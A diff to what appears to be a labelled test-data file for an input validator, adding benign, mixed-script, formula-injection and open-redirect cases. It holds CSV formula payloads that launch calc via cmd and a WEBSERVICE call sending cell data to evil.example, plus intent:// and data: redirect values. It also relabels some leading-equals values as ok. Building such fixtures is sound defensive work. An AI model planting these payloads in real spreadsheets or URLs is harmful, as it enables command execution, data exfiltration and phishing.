@@ -117,6 +117,9 @@ ok text 東京 Tokyo
 ok id привет
 ok text α-test
 ok text naïve café façade
+ok text Ωmega Watch
+ok text Resistor 10kΩ 1/4W
+mixed_scripts text Мaтрёшка
 
 # --- formula_injection ---
 formula_injection text =cmd|' /C calc'!A0
@@ -124,9 +127,16 @@ formula_injection text =HYPERLINK("http://evil.example","click")
 formula_injection text +cmd|' /C calc'!A0
 formula_injection text -2+3+cmd|' /C calc'!A0
 formula_injection text @SUM(1+1)*cmd|' /C calc'!A0
-formula_injection text "\t=1+1"
-formula_injection text ＝1+1
+formula_injection text "\t=SUM(1,2)"
+formula_injection text =WEBSERVICE("http://evil.example/?"&A1)
 ok text -12.5
+ok text -20% (Black Friday)
+ok text +15% phí ship (nội thành)
+ok text === Khuyến mãi tháng 11 ===
+ok text ==
+ok text =1+1
+ok text ＝SUM(1)
+ok text %3DSUM(1)
 ok text +84 912 345 678
 ok text +1 (555) 123-4567
 ok text @john great post
@@ -195,3 +205,8 @@ ok redirect https://checkout.shop.example.com/
 ok redirect ?page=2
 ok redirect orders/1001
 ok redirect #top
+ok redirect Hotline: 1900 1234
+ok redirect C:\Users\shop\export.csv
+ok redirect mailto:cskh@shop.example
+open_redirect redirect intent://evil.example/#Intent;end
+open_redirect redirect data:text/plain,hi
